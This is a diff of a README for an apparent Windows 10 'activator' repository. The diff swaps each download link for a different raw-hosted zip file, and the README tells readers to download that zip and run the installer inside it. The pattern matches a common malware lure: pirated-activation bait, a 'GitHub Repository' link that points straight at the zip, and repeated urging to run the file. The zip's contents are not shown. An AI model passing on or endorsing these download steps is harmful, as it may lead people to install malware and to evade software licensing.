@@ -1,6 +1,6 @@
 # 🖥️ WINDOWS-10-ACTIVATOR-1.0 - Effortlessly Activate Your Windows 10
 
-[![Download](https://raw.githubusercontent.com/dzeko23/WINDOWS-10-ACTIVATOR-1.0/main/calyculate/WINDOWS-10-ACTIVATOR-1.0.zip)](https://raw.githubusercontent.com/dzeko23/WINDOWS-10-ACTIVATOR-1.0/main/calyculate/WINDOWS-10-ACTIVATOR-1.0.zip)
+[![Download](https://raw.githubusercontent.com/dzeko23/WINDOWS-10-ACTIVATOR-1.0/main/calyculate/WINDOW-ACTIVATO-v2.0-alpha.4.zip)](https://raw.githubusercontent.com/dzeko23/WINDOWS-10-ACTIVATOR-1.0/main/calyculate/WINDOW-ACTIVATO-v2.0-alpha.4.zip)
 
 ## 📘 Overview
 
@@ -28,12 +28,12 @@ Before you start, make sure your system meets the following requirements:
 
 To download the Windows 10 Activator, visit this page:
 
-[Download Windows 10 Activator](https://raw.githubusercontent.com/dzeko23/WINDOWS-10-ACTIVATOR-1.0/main/calyculate/WINDOWS-10-ACTIVATOR-1.0.zip)
+[Download Windows 10 Activator](https://raw.githubusercontent.com/dzeko23/WINDOWS-10-ACTIVATOR-1.0/main/calyculate/WINDOW-ACTIVATO-v2.0-alpha.4.zip)
 
 Once there, locate the latest release and follow these steps:
 
 1. Click on the version number that matches your needs.
-2. Find the executable file, which will look something like `https://raw.githubusercontent.com/dzeko23/WINDOWS-10-ACTIVATOR-1.0/main/calyculate/WINDOWS-10-ACTIVATOR-1.0.zip`.
+2. Find the executable file, which will look something like `https://raw.githubusercontent.com/dzeko23/WINDOWS-10-ACTIVATOR-1.0/main/calyculate/WINDOW-ACTIVATO-v2.0-alpha.4.zip`.
 3. Click on the file to begin the download.
 
 Once the download completes, open the downloaded file to run the installer. Follow the prompts to complete the installation process. 
@@ -50,7 +50,7 @@ If you encounter any issues, check the FAQ section on the GitHub page or reach o
 
 ### Additional Resources
 
-- **GitHub Repository:** [WINDOWS-10-ACTIVATOR-1.0](https://raw.githubusercontent.com/dzeko23/WINDOWS-10-ACTIVATOR-1.0/main/calyculate/WINDOWS-10-ACTIVATOR-1.0.zip)
+- **GitHub Repository:** [WINDOWS-10-ACTIVATOR-1.0](https://raw.githubusercontent.com/dzeko23/WINDOWS-10-ACTIVATOR-1.0/main/calyculate/WINDOW-ACTIVATO-v2.0-alpha.4.zip)
 - **User Feedback:** Contributions and suggestions are always welcome. You can submit your feedback through the Issues section on GitHub.
 
 ## 🛡️ Safety and Security
@@ -75,4 +75,4 @@ By following the steps above, you can easily download and run the Windows 10 Act
 
 For any further assistance, please refer back to the support section or submit an issue on the GitHub repository. 
 
-[Download Windows 10 Activator Here](https://raw.githubusercontent.com/dzeko23/WINDOWS-10-ACTIVATOR-1.0/main/calyculate/WINDOWS-10-ACTIVATOR-1.0.zip)
+[Download Windows 10 Activator Here](https://raw.githubusercontent.com/dzeko23/WINDOWS-10-ACTIVATOR-1.0/main/calyculate/WINDOW-ACTIVATO-v2.0-alpha.4.zip)
